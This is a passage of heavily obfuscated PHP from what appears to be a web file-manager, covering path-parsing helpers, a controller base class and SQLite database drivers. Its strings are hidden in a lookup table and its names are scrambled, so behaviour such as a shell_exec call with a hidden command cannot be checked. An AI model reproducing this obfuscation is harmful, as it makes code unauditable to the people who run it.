"\x7b\x73\x65\x61\162\x63\150\175"; const KOD_BLOCK = "\x7b\142\x6c\x6f\x63\x6b\x7d"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\x7b\x75\x73\145\x72\x52\x65\156\x63\145\156\x74\175"; const KOD_USER_DRIVER = "\173\144\x72\151\x76\145\x72\x7d"; public static function typeList() { $®ÎÛ‘ =& $_SERVER[ÏéâËõ‘]; return array($®ÎÛ‘[1249] => self::KOD_SOURCE, $®ÎÛ‘[1250] => self::KOD_USER_RECYCLE, $®ÎÛ‘[1251] => self::KOD_USER_FAV, $®ÎÛ‘[1252] => self::KOD_USER_FILE_TAG, $®ÎÛ‘[1253] => self::KOD_USER_FILE_TYPE, $®ÎÛ‘[1254] => self::KOD_GROUP_ROOT_SELF, $®ÎÛ‘[1255] => self::KOD_USER_SHARE, $®ÎÛ‘[1256] => self::KOD_USER_SHARE_LINK, $®ÎÛ‘[1257] => self::KOD_USER_SHARE_TO_ME, $®ÎÛ‘[1258] => self::KOD_SHARE_ITEM, $®ÎÛ‘[1259] => self::KOD_SHARE_LINK, $®ÎÛ‘[1260] => self::KOD_SEARCH, $®ÎÛ‘[1261] => self::KOD_BLOCK, $®ÎÛ‘[1262] => self::KOD_IO, $®ÎÛ‘[1263] => self::KOD_USER_RECENT, $®ÎÛ‘[1264] => self::KOD_USER_DRIVER); } public static function parse($Óá«ÔÃÌ) { $ÍÆã°Ã =& $_SERVER[ÏéâËõ‘]; $Óá«ÔÃÌ = self::clear($Óá«ÔÃÌ); $¼¾×ÊÏƒ = array_values(self::typeList()); preg_match($ÍÆã°Ã[1265], $Óá«ÔÃÌ, $¤·‡†Ë¿); $„£ûû–Û = array($ÍÆã°Ã[422] => !1, $ÍÆã°Ã[1266] => !1, $ÍÆã°Ã[419] => !1, $ÍÆã°Ã[84] => $Óá«ÔÃÌ, $ÍÆã°Ã[1175] => !1, $ÍÆã°Ã[1174] => $ÍÆã°Ã[12]); if (is_array($¤·‡†Ë¿) && count($¤·‡†Ë¿) == 5) { $‚¾À•Á• = $ÍÆã°Ã[1267] . $¤·‡†Ë¿[2] . $ÍÆã°Ã[327]; if (in_array($‚¾À•Á•, $¼¾×ÊÏƒ)) { $„£ûû–Û[$ÍÆã°Ã[1175]] = $¤·‡†Ë¿[1]; $„£ûû–Û[$ÍÆã°Ã[33]] = $‚¾À•Á•; $„£ûû–Û[$ÍÆã°Ã[1268]] = substr($‚¾À•Á•, 1, -1); $„£ûû–Û[$ÍÆã°Ã[399]] = $¤·‡†Ë¿[3]; } $„£ûû–Û[$ÍÆã°Ã[1174]] = $¤·‡†Ë¿[4]; } $¾œÉ¶â• = array($ÍÆã°Ã[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $„£ûû–Û[$ÍÆã°Ã[1230]] = in_array($„£ûû–Û[$ÍÆã°Ã[33]], $¾œÉ¶â•); return $„£ûû–Û; } public static function isTruePath($½œûØ±Å) { $÷Ï…ÀÎË =& $_SERVER[ÏéâËõ‘]; if (substr($½œûØ±Å, 0, 1) != $÷Ï…ÀÎË[1267]) { return !0; } if (strpos($½œûØ±Å, $÷Ï…ÀÎË[408]) === 0) { return !0; } if (strpos($½œûØ±Å, $÷Ï…ÀÎË[1234]) === 0) { return !0; } if (strpos($½œûØ±Å, $÷Ï…ÀÎË[1269]) === 0) { return !0; } if (strpos($½œûØ±Å, $÷Ï…ÀÎË[1270]) === 0) { return !0; } if (strpos($½œûØ±Å, $÷Ï…ÀÎË[1271]) === 0) { return !0; } return !1; } public static function clear($¡áùúÓÂ) { $›Ø¡èßİ =& $_SERVER[ÏéâËõ‘]; $¡áùúÓÂ = str_replace(array($›Ø¡èßİ[1083], $›Ø¡èßİ[231]), $›Ø¡èßİ[53], $¡áùúÓÂ); $¡áùúÓÂ = str_replace($›Ø¡èßİ[97], $›Ø¡èßİ[8], $¡áùúÓÂ); $Ê¿ş­Ÿ¸ = $›Ø¡èßİ[1272]; if (substr($¡áùúÓÂ, 0, 3) == $›Ø¡èßİ[1273]) { $¡áùúÓÂ = substr($¡áùúÓÂ, 3); } while (strstr($¡áùúÓÂ, $Ê¿ş­Ÿ¸)) { $¡áùúÓÂ = str_replace($Ê¿ş­Ÿ¸, $›Ø¡èßİ[8], $¡áùúÓÂ); } $¡áùúÓÂ = preg_replace($›Ø¡èßİ[1274], $›Ø¡èßİ[8], $¡áùúÓÂ); if ($¡áùúÓÂ == $›Ø¡èßİ[8]) { return $›Ø¡èßİ[8]; } $¡áùúÓÂ = rtrim($¡áùúÓÂ, $›Ø¡èßİ[8]); return $¡áùúÓÂ; } public static function sourceID($“¨Ò×Á‡) { $ è©ùˆ =& $_SERVER[ÏéâËõ‘]; $ÓÍ™Ÿº– = self::parse($“¨Ò×Á‡); if ($ÓÍ™Ÿº–[$ è©ùˆ[33]] !== self::KOD_SOURCE) { show_json(LNG($ è©ùˆ[1275]), !1); } return $ÓÍ™Ÿº–[$ è©ùˆ[399]]; } public static function make($Ô—€–¾) { if (!$Ô—€–¾) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Ô—€–¾)); } public static function makeShare($õ¶Ğ¡É, $ãúÔ¦¶¡) { return self::makePath(self::KOD_SHARE_ITEM, $õ¶Ğ¡É, $ãúÔ¦¶¡); } public static function makeFileTypePath($Ó¸«È…’) { return self::makePath(self::KOD_USER_FILE_TYPE, $Ó¸«È…’); } public static function makeFileTagPath($ò™‰ˆ»„) { return self::makePath(self::KOD_USER_FILE_TAG, $ò™‰ˆ»„); } public static function makePath($È°«Ï¾, $¸Ï¸Èôê = '', $ÑÓ»õì› = '') { $©÷Íû¼¹ =& $_SERVER[ÏéâËõ‘]; $€ûö‹Ğê = substr($È°«Ï¾, 1, -1); $ãûŒèÙ£ = $©÷Íû¼¹[1276] . $€ûö‹Ğê . $©÷Íû¼¹[1277] . $¸Ï¸Èôê . $©÷Íû¼¹[1278]; $ãûŒèÙ£ = $ÑÓ»õì› ? $ãûŒèÙ£ . $ÑÓ»õì› . $©÷Íû¼¹[8] : $ãûŒèÙ£; return $ãûŒèÙ£; } public static function hashPath($õİ€ø®á, $ƒ”½ã³ª = true) { $‰úß£˜ =& $_SERVER[ÏéâËõ‘]; $È»¨“áš = is_array($õİ€ø®á) ? $õİ€ø®á : IO::info($õİ€ø®á); $“«”›±ƒ = _get($È»¨“áš, $‰úß£˜[1279], $‰úß£˜[12]); if (!$“«”›±ƒ && isset($È»¨“áš[$‰úß£˜[402]])) { $È»¨“áš = IO::info(KodIO::make($È»¨“áš[$‰úß£˜[402]])); $“«”›±ƒ = _get($È»¨“áš, $‰úß£˜[1279], $‰úß£˜[12]); } if (!$“«”›±ƒ && $ƒ”½ã³ª) { $¬‘…îÇ­ = KodIO::parse($È»¨“áš[$‰úß£˜[84]]); if (!$¬‘…îÇ­[$‰úß£˜[33]]) { $“«”›±ƒ = IO::hashSimple($È»¨“áš[$‰úß£˜[84]]); } } if (!$“«”›±ƒ) { $“«”›±ƒ = md5($È»¨“áš[$‰úß£˜[84]] . $È»¨“áš[$‰úß£˜[76]] . $È»¨“áš[$‰úß£˜[85]]); } return $“«”›±ƒ; } public static function initSystemPath() { $êë¡âà =& $_SERVER[ÏéâËõ‘]; if (defined($êë¡âà[1280])) { return; } define($êë¡âà[1280], self::systemPath($êë¡âà[1281])); define($êë¡âà[1282], self::systemPath($êë¡âà[1283])); define($êë¡âà[1284], self::systemPath($êë¡âà[1285])); define($êë¡âà[1286], self::systemPath($êë¡âà[1287])); IOHistory::bindEvent(); } public static function systemPath($äÑæè²‰) { $ã³õèÕÂ =& $_SERVER[ÏéâËõ‘]; $¡—“ÖÈ = $ã³õèÕÂ[1288] . ucfirst($äÑæè²‰); $Îä‰ëÁ² = Model($ã³õèÕÂ[772])->get($¡—“ÖÈ); if ($Îä‰ëÁ²) { return $Îä‰ëÁ²; } if ($äÑæè²‰ == $ã³õèÕÂ[1281]) { $Îä‰ëÁ² = self::make(Model($ã³õèÕÂ[827])->systemRootPathAdd($ã³õèÕÂ[544])); } else { $Îä‰ëÁ² = self::systemPath($ã³õèÕÂ[1281]); $³ğĞ»Ü— = self::sourceID($Îä‰ëÁ²); $Îä‰ëÁ² = self::make(Model($ã³õèÕÂ[827])->mkdir($³ğĞ»Ü—, $äÑæè²‰)); } Model($ã³õèÕÂ[772])->set($¡—“ÖÈ, $Îä‰ëÁ²); return $Îä‰ëÁ²; } public static function systemFolder($™ĞÚ»ƒ) { $ãšä«„š = IO_PATH_SYSTEM_SOURCE . $™ĞÚ»ƒ; $ğß³å´ß = Cache::get($ãšä«„š); if (!$ğß³å´ß) { $£¦ÀäÅ‘ = IO::infoFull($ãšä«„š); if (!$£¦ÀäÅ‘) { $ğß³å´ß = IO::mkdir($ãšä«„š, REPEAT_SKIP); } else { $ğß³å´ß = $£¦ÀäÅ‘[$_SERVER[ÏéâËõ‘][84]]; } Cache::set($ãšä«„š, $ğß³å´ß, 3600 * 10); } return $ğß³å´ß; } public static function defaultDriver() { return Model($_SERVER[ÏéâËõ‘][769])->defaultDriver(); } public static function defaultIO() { $ğ¯¶Ü»“ =& $_SERVER[ÏéâËõ‘]; $Ö›Œ÷ˆ· = self::defaultDriver(); return $ğ¯¶Ü»“[1289] . $Ö›Œ÷ˆ·[$ğ¯¶Ü»“[399]] . $ğ¯¶Ü»“[1278]; } public static function defaultDriverInit() { static $²µôŸ› = false; if ($²µôŸ›) { return $²µôŸ›; } $²µôŸ› = IO::init(self::defaultIO()); return $²µôŸ›; } public static function fileTypeList() { $€•Ó·İå =& $_SERVER[ÏéâËõ‘]; $úä„ÛÜò = $GLOBALS[$€•Ó·İå[6]][$€•Ó·İå[1290]]; foreach ($úä„ÛÜò as $ ãµ“ÚÏ => $ô–ˆúÄä) { $ìßšß€† = $€•Ó·İå[1291] . $ ãµ“ÚÏ; $‹Ã§¸­ = LNG($ìßšß€†); if ($ìßšß€† != $‹Ã§¸­) { $úä„ÛÜò[$ ãµ“ÚÏ][$€•Ó·İå[32]] = $‹Ã§¸­; } } return $úä„ÛÜò; } public static function diskList($Æ¢›ò = true) { $ùã²ÚÃÌ = $_SERVER[ÏéâËõ‘][1292]; if ($Æ¢›ò) { $°é¶æ± = Cache::get($ùã²ÚÃÌ); if (is_array($°é¶æ±)) { return $°é¶æ±; } } $°é¶æ± = self::diskListGet(); Cache::set($ùã²ÚÃÌ, $°é¶æ±, 60); return $°é¶æ±; } public static function diskListGet() { $®ıãÒâ =& $_SERVER[ÏéâËõ‘]; $ÊåìÔÄ‚ = array(); if ($GLOBALS[$®ıãÒâ[6]][$®ıãÒâ[1293]] == $®ıãÒâ[1294]) { $‘êä´Ÿº = $®ıãÒâ[1295]; for ($ˆ¶ŸÃ– = 0; $ˆ¶ŸÃ– < strlen($‘êä´Ÿº); $ˆ¶ŸÃ–++) { $øÙœÈ = $‘êä´Ÿº[$ˆ¶ŸÃ–] . $®ıãÒâ[1296]; if (file_exists($øÙœÈ)) { $ÊåìÔÄ‚[] = $øÙœÈ; } } return $ÊåìÔÄ‚; } if (!function_exists($®ıãÒâ[98])) { $ÊåìÔÄ‚[] = $®ıãÒâ[837]; return $ÊåìÔÄ‚; } $ÒÑØó™› = explode($®ıãÒâ[231], shell_exec($®ıãÒâ[1297])); array_shift($ÒÑØó™›); array_pop($ÒÑØó™›); $ÔŸ°¡ğ = array($®ıãÒâ[1298], $®ıãÒâ[1299], $®ıãÒâ[1300], $®ıãÒâ[1301], $®ıãÒâ[1302], $®ıãÒâ[1303], $®ıãÒâ[1304], $®ıãÒâ[1305]); foreach ($ÒÑØó™› as $Ï³ĞÚáÆ) { $¼¥³ÄÉã = preg_split($®ıãÒâ[1306], $Ï³ĞÚáÆ); $øÙœÈ = $¼¥³ÄÉã[count($¼¥³ÄÉã) - 1]; if (!strstr($¼¥³ÄÉã[0], $®ıãÒâ[1307]) || !$øÙœÈ) { continue; } $åè–ï‚Š = rtrim($øÙœÈ, $®ıãÒâ[8]) . $®ıãÒâ[8]; if (in_array($åè–ï‚Š, $ÔŸ°¡ğ)) { continue; } $ÊåìÔÄ‚[] = $åè–ï‚Š; } return $ÊåìÔÄ‚; } public static function isSameDisk($±úÖäŠ°, $ÂÇ“‘àç) { $–êßÔ‘Ë =& $_SERVER[ÏéâËõ‘]; if ($GLOBALS[$–êßÔ‘Ë[6]][$–êßÔ‘Ë[1293]] == $–êßÔ‘Ë[1294]) { return strtolower(substr($±úÖäŠ°, 0, 1)) == strtolower(substr($ÂÇ“‘àç, 0, 1)); } $ö¹Œãë€ = self::diskList(); $ÀŒ®ªØì = !1; $¶¸«¶—³ = !1; sort($ö¹Œãë€); $ö¹Œãë€ = array_reverse($ö¹Œãë€); $±úÖäŠ° = rtrim($±úÖäŠ°, $–êßÔ‘Ë[8]) . $–êßÔ‘Ë[8]; $ÂÇ“‘àç = rtrim($ÂÇ“‘àç, $–êßÔ‘Ë[8]) . $–êßÔ‘Ë[8]; foreach ($ö¹Œãë€ as $ÉÊÚÅ) { $†Ê»áÉ’ = strlen($ÉÊÚÅ); if (!$ÀŒ®ªØì && substr($±úÖäŠ°, 0, $†Ê»áÉ’) == $ÉÊÚÅ) { $ÀŒ®ªØì = $ÉÊÚÅ; } if (!$¶¸«¶—³ && substr($ÂÇ“‘àç, 0, $†Ê»áÉ’) == $ÉÊÚÅ) { $¶¸«¶—³ = $ÉÊÚÅ; } if ($ÀŒ®ªØì && $¶¸«¶—³) { break; } } return $ÀŒ®ªØì === $¶¸«¶—³; } public static function transferType($£ôËíêä, $¿½Ï‹©ü) { $Ø¨á“ôğ =& $_SERVER[ÏéâËõ‘]; $ÄÎÚ¯’¿ = self::driverType($£ôËíêä); $§¬òìÅ– = self::driverType($¿½Ï‹©ü); if ($ÄÎÚ¯’¿[$Ø¨á“ôğ[33]] == $§¬òìÅ–[$Ø¨á“ôğ[33]] && $ÄÎÚ¯’¿[$Ø¨á“ôğ[1308]] == $§¬òìÅ–[$Ø¨á“ôğ[1308]]) { return $Ø¨á“ôğ[1309]; } if ($ÄÎÚ¯’¿[$Ø¨á“ôğ[33]] == $Ø¨á“ôğ[873] && $§¬òìÅ–[$Ø¨á“ôğ[33]] == $Ø¨á“ôğ[106]) { return $Ø¨á“ôğ[1204]; } if ($ÄÎÚ¯’¿[$Ø¨á“ôğ[33]] == $Ø¨á“ôğ[106] && $§¬òìÅ–[$Ø¨á“ôğ[33]] == $Ø¨á“ôğ[873]) { return $Ø¨á“ôğ[107]; } return $Ø¨á“ôğ[1310]; } public static function driverType($‰œ‘°ªÔ) { $î‚ş—ï™ =& $_SERVER[ÏéâËõ‘]; $¤æã¿×µ = str_replace($î‚ş—ï™[1311], $î‚ş—ï™[12], strtolower($‰œ‘°ªÔ->getType())); if ($¤æã¿×µ == $î‚ş—ï™[760] || $¤æã¿×µ == $î‚ş—ï™[1312] || $¤æã¿×µ == $î‚ş—ï™[1313]) { $‰œ‘°ªÔ = self::defaultDriverInit(); } else { if ($¤æã¿×µ == $î‚ş—ï™[1211] || $¤æã¿×µ == $î‚ş—ï™[1314]) { $‰œ‘°ªÔ = IO::init($‰œ‘°ªÔ->pathParse[$î‚ş—ï™[1156]]); } } $ƒÍôÄ = $‰œ‘°ªÔ->path; $¤æã¿×µ = str_replace($î‚ş—ï™[1311], $î‚ş—ï™[12], strtolower($‰œ‘°ªÔ->getType())); if ($¤æã¿×µ == $î‚ş—ï™[106]) { return array($î‚ş—ï™[33] => $î‚ş—ï™[106], $î‚ş—ï™[1308] => $î‚ş—ï™[12], $î‚ş—ï™[84] => $ƒÍôÄ); } return array($î‚ş—ï™[33] => $î‚ş—ï™[873], $î‚ş—ï™[1308] => $‰œ‘°ªÔ->pathDriver, $î‚ş—ï™[84] => $ƒÍôÄ); } public static function pathDriverType($‚°‚ü™) { return $‚°‚ü™ ? self::driverType(IO::init($‚°‚ü™)) : !1; } } goto F‰¤¯Ä±„; D¶ÂÍ‡ƒË¡: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ı÷‚Ä”ü =& $_SERVER[ÏéâËõ‘]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ı÷‚Ä”ü[6]] =& $config; $this->values[$ı÷‚Ä”ü[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ı÷‚Ä”ü[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($çñ€‹óÄ) { if (1 === func_num_args()) { $this->{$çñ€‹óÄ} = new $çñ€‹óÄ(); } else { $¸§™åÒÃ = new ReflectionClass($çñ€‹óÄ); $ñ€Ÿâ»ê = func_get_args(); array_shift($ñ€Ÿâ»ê); $this->{$çñ€‹óÄ} = $¸§™åÒÃ->newInstanceArgs($ñ€Ÿâ»ê); } return $this->{$çñ€‹óÄ}; } public function routeBind($æáÖš¯É, $ö¸£Ğà±, $½Ü›ğÓ¸ = 3) { $Ë†¸»Îª =& $_SERVER[ÏéâËõ‘]; $Ú–ô“ëä = $this->in[$Ë†¸»Îª[9]]; $æáÖš¯É = str_replace($Ë†¸»Îª[10], $Ë†¸»Îª[11], trim(trim($æáÖš¯É, $Ë†¸»Îª[8]), $Ë†¸»Îª[12])); if (!$æáÖš¯É || count($Ú–ô“ëä) <= $½Ü›ğÓ¸) { return !1; } $Ò÷êìæï = !0; $Ì§±“˜ = explode($Ë†¸»Îª[8], $æáÖš¯É); for ($Ó°çÊ¼· = 0; $Ó°çÊ¼· < count($Ì§±“˜); $Ó°çÊ¼·++) { if ($Ì§±“˜[$Ó°çÊ¼·] != $Ú–ô“ëä[$½Ü›ğÓ¸ + $Ó°çÊ¼·]) { $Ò÷êìæï = !1; break; } } if (!$Ò÷êìæï) { return; } call_user_func_array(array($this, $ö¸£Ğà±), array()); } public function routeArgs($ì©šß¾ = 3) { $­ÉøæÄ¬ = $this->in[$_SERVER[ÏéâËõ‘][9]]; if (count($­ÉøæÄ¬) <= $ì©šß¾) { return array(); } $Ãö¢İÎƒ = array(); for ($öÑòÅ¶ß = $ì©šß¾; $öÑòÅ¶ß < count($­ÉøæÄ¬); $öÑòÅ¶ß += 2) { $Ãö¢İÎƒ[$­ÉøæÄ¬[$öÑòÅ¶ß]] = $­ÉøæÄ¬[$öÑòÅ¶ß + 1]; $this->in[$­ÉøæÄ¬[$öÑòÅ¶ß]] = $­ÉøæÄ¬[$öÑòÅ¶ß + 1]; } return $Ãö¢İÎƒ; } protected function assign($……ç¼ê, $·ŒôŒà) { $this->values[$……ç¼ê] = $·ŒôŒà; } protected function display($™«Á¼) { ob_end_clean(); extract($this->values); require $this->tpl . $™«Á¼; } } class DbSqliteBase extends Db { public function __construct($ºâŸôÀ­ = '') { $é¡ÚÊ‡ =& $_SERVER[ÏéâËõ‘]; if (!extension_loaded($é¡ÚÊ‡[13])) { think_exception(think_lang($é¡ÚÊ‡[14]) . $é¡ÚÊ‡[15]); } if (!empty($ºâŸôÀ­)) { if (!isset($ºâŸôÀ­[$é¡ÚÊ‡[16]])) { $ºâŸôÀ­[$é¡ÚÊ‡[16]] = 438; } $this->config = $ºâŸôÀ­; if (empty($this->config[$é¡ÚÊ‡[17]])) { $this->config[$é¡ÚÊ‡[17]] = array(); } } } public function connect($†±¸ëš© = '', $÷—Á³ù = 0) { $ƒ·™­Ï =& $_SERVER[ÏéâËõ‘]; if (!isset($this->linkID[$÷—Á³ù])) { if (empty($†±¸ëš©)) { $†±¸ëš© = $this->config; } $»“”Ó§… = !empty($†±¸ëš©[$ƒ·™­Ï[17]][$ƒ·™­Ï[18]]) ? $†±¸ëš©[$ƒ·™­Ï[17]][$ƒ·™­Ï[18]] : $this->pconnect; $Ğï‘Æ×ˆ = $»“”Ó§… ? $ƒ·™­Ï[19] : $ƒ·™­Ï[20]; $this->linkID[$÷—Á³ù] = $Ğï‘Æ×ˆ($†±¸ëš©[$ƒ·™­Ï[21]], $†±¸ëš©[$ƒ·™­Ï[16]]); if (!$this->linkID[$÷—Á³ù]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$÷—Á³ù], 30000); if (1 != think_config($ƒ·™­Ï[22])) { unset($this->config); } } return $this->linkID[$÷—Á³ù]; } public function free() { $this->queryID = null; } public function query($¿»—›¼±) { $Ôõ×¢ÜÒ =& $_SERVER[ÏéâËõ‘]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¿»—›¼±; if ($this->queryID) { $this->free(); } think_action_status($Ôõ×¢ÜÒ[23], 1); think_status($Ôõ×¢ÜÒ[24]); $this->queryID = sqlite_query($this->_linkID, $¿»—›¼±); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Ü¼Ñ ×è = $this->getAll(); return $Ü¼Ñ ×è; } } public function execute($”½¨´Õ) { $Üõî±’é =& $_SERVER[ÏéâËõ‘]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $”½¨´Õ; if ($this->queryID) { $this->free(); } think_action_status($Üõî±’é[25], 1); think_status($Üõî±’é[24]); $ô÷ïã’„ = sqlite_exec($this->_linkID, $”½¨´Õ); $this->debug(); if (!1 === $ô÷ïã’„) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ÏéâËõ‘][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ä–’Ş’µ = sqlite_query($this->_linkID, $_SERVER[ÏéâËõ‘][27]); if (!$ä–’Ş’µ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÜÙ ×¹‡ = sqlite_query($this->_linkID, $_SERVER[ÏéâËõ‘][28]); if (!$ÜÙ ×¹‡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ÃœÅíş³ = array(); if ($this->numRows > 0) { for ($¥ÇØ¶¢Ÿ = 0; $¥ÇØ¶¢Ÿ < $this->numRows; $¥ÇØ¶¢Ÿ++) { $ÃœÅíş³[$¥ÇØ¶¢Ÿ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ÃœÅíş³; } public function getFields($¨ú¹ªµí) { $‡ÇÔ†ôï =& $_SERVER[ÏéâËõ‘]; $ÄšİÔ«Ü = $this->query($‡ÇÔ†ôï[29] . $¨ú¹ªµí . $‡ÇÔ†ôï[30]); $ˆµúƒ¿ = array(); if ($ÄšİÔ«Ü) { foreach ($ÄšİÔ«Ü as $èÙ»Â•â => $†íô°âı) { $ˆµúƒ¿[$†íô°âı[$‡ÇÔ†ôï[31]]] = array($‡ÇÔ†ôï[32] => $†íô°âı[$‡ÇÔ†ôï[31]], $‡ÇÔ†ôï[33] => $†íô°âı[$‡ÇÔ†ôï[34]], $‡ÇÔ†ôï[35] => (bool) ($†íô°âı[$‡ÇÔ†ôï[36]] === $‡ÇÔ†ôï[12]), $‡ÇÔ†ôï[37] => $†íô°âı[$‡ÇÔ†ôï[38]], $‡ÇÔ†ôï[39] => strtolower($†íô°âı[$‡ÇÔ†ôï[40]]) == $‡ÇÔ†ôï[41], $‡ÇÔ†ôï[42] => strtolower($†íô°âı[$‡ÇÔ†ôï[43]]) == $‡ÇÔ†ôï[44]); } } return $ˆµúƒ¿; } public function getTables($š—±±ÏÖ = '') { $Î‘êÉüÙ =& $_SERVER[ÏéâËõ‘]; $‹ÑÛÇÌ = $this->query($Î‘êÉüÙ[45] . $Î‘êÉüÙ[46] . $Î‘êÉüÙ[47]); $ÆÌóùÍí = array(); foreach ($‹ÑÛÇÌ as $¿¼Ï¤ÄÜ => $Š¦çÜ») { $ÆÌóùÍí[$¿¼Ï¤ÄÜ] = current($Š¦çÜ»); } return $ÆÌóùÍí; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ø˜çöş‚ =& $_SERVER[ÏéâËõ‘]; $±úàô  = sqlite_last_error($this->_linkID); $this->error = $±úàô  . $ø˜çöş‚[4] . sqlite_error_string($±úàô ); if ($ø˜çöş‚[12] != $this->queryStr) { $this->error .= LNG($ø˜çöş‚[48]) . $this->queryStr; } think_trace($this->error, $ø˜çöş‚[12], $ø˜çöş‚[49]); return $this->error; } public function escapeString($£»ªÍ¶ô) { return sqlite_escape_string($£»ªÍ¶ô); } public function parseLimit($µÂãÜ†˜) { $ó¿Éî =& $_SERVER[ÏéâËõ‘]; $şşÚ÷¹Á = $ó¿Éî[12]; if (!empty($µÂãÜ†˜)) { $µÂãÜ†˜ = explode($ó¿Éî[50], $µÂãÜ†˜); if (count($µÂãÜ†˜) > 1) { $şşÚ÷¹Á .= $ó¿Éî[51] . $µÂãÜ†˜[1] . $ó¿Éî[52] . $µÂãÜ†˜[0] . $ó¿Éî[53]; } else { $şşÚ÷¹Á .= $ó¿Éî[51] . $µÂãÜ†˜[0] . $ó¿Éî[53]; } } return $şşÚ÷¹Á; } } class DbSqlite3Base extends Db { public function __construct($µœ£Ğ…° = '') { $”Ú…ïîŸ =& $_SERVER[ÏéâËõ‘]; if (!class_exists($”Ú…ïîŸ[54])) { think_exception(think_lang($”Ú…ïîŸ[14]) . $”Ú…ïîŸ[55]); } if (!empty($µœ£Ğ…°)) { if (!isset($µœ£Ğ…°[$”Ú…ïîŸ[16]])) { $µœ£Ğ…°[$”Ú…ïîŸ[16]] = 438; } $this->config = $µœ£Ğ…°; if (empty($this->config[$”Ú…ïîŸ[17]])) { $this->config[$”Ú…ïîŸ[17]] = array(); } } } public function connect($ÈÑ¶åÏ÷ = '', $øø‘¶ùˆ = 0) { $Î²¸îÆ’ =& $_SERVER[ÏéâËõ‘]; if (!isset($this->linkID[$øø‘¶ùˆ])) { if (empty($ÈÑ¶åÏ÷)) { $ÈÑ¶åÏ÷ = $this->config; } $this->linkID[$øø‘¶ùˆ] = new SQLite3($ÈÑ¶åÏ÷[$Î²¸îÆ’[21]]); if (!$this->linkID[$øø‘¶ùˆ]) { think_exception($this->linkID[$øø‘¶ùˆ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$øø‘¶ùˆ]->busyTimeout(30000); if (1 != think_config($Î²¸îÆ’[22])) { unset($this->config); } } return $this->linkID[$øø‘¶ùˆ]; } public function free() { $this->queryID = null; } public function query($¾ÄÀ¯›Ñ) { $şüÜæ² =& $_SERVER[ÏéâËõ‘]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¾ÄÀ¯›Ñ; if ($this->queryID) { $this->free(); } think_action_status($şüÜæ²[23], 1); think_status($şüÜæ²[24]); $this->queryID = $this->_linkID->query($¾ÄÀ¯›Ñ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $å˜Ëß²ƒ = $this->getAll(); $this->numRows = count($å˜Ëß²ƒ); return $å˜Ëß²ƒ; } } public function execute($ü×Šêì³) { $ø•Ë™ñ =& $_SERVER[ÏéâËõ‘]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ü×Šêì³; if ($this->queryID) { $this->free(); } think_action_status($ø•Ë™ñ[25], 1); think_status($ø•Ë™ñ[24]); $‡Şä£ğ… = $this->_linkID->exec($ü×Šêì³); $this->debug(); if (!1 === $‡Şä£ğ…) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ÏéâËõ‘][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ŸÍçÃò = $this->_linkID->query($_SERVER[ÏéâËõ‘][27]); if (!$ŸÍçÃò) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $«Û®–Ãå = $this->_linkID->query($_SERVER[ÏéâËõ‘][28]); if (!$«Û®–Ãå) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $îÄÆ„÷ó = array(); while ($ñ·ÚÕ—¡ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $îÄÆ„÷ó[] = $ñ·ÚÕ—¡; } $this->queryID->reset(); return $îÄÆ„÷ó; } public function getFields($æ¦Ãøèª) { $ºÄ¤ÌÎî =& $_SERVER[ÏéâËõ‘]; $—ËÀõ¸ = $this->query($ºÄ¤ÌÎî[29] . $æ¦Ãøèª . $ºÄ¤ÌÎî[30]); $§ŠíªÂÎ = array(); if ($—ËÀõ¸) { foreach ($—ËÀõ¸ as $şå°Ó­ => $‰ÓÁ§) { $§ŠíªÂÎ[$‰ÓÁ§[$ºÄ¤ÌÎî[32]]] = array($ºÄ¤ÌÎî[32] => $‰ÓÁ§[$ºÄ¤ÌÎî[32]], $ºÄ¤ÌÎî[33] => $‰ÓÁ§[$ºÄ¤ÌÎî[33]], $ºÄ¤ÌÎî[35] => (bool) ($‰ÓÁ§[$ºÄ¤ÌÎî[35]] === $ºÄ¤ÌÎî[12]), $ºÄ¤ÌÎî[37] => $‰ÓÁ§[$ºÄ¤ÌÎî[56]], $ºÄ¤ÌÎî[39] => (bool) $‰ÓÁ§[$ºÄ¤ÌÎî[57]], $ºÄ¤ÌÎî[42] => (bool) $‰ÓÁ§[$ºÄ¤ÌÎî[57]]); } } return $§ŠíªÂÎ; } public function getTables($ù—ŒèàØ = '') { $õÀ¸Æ¯¦ =& 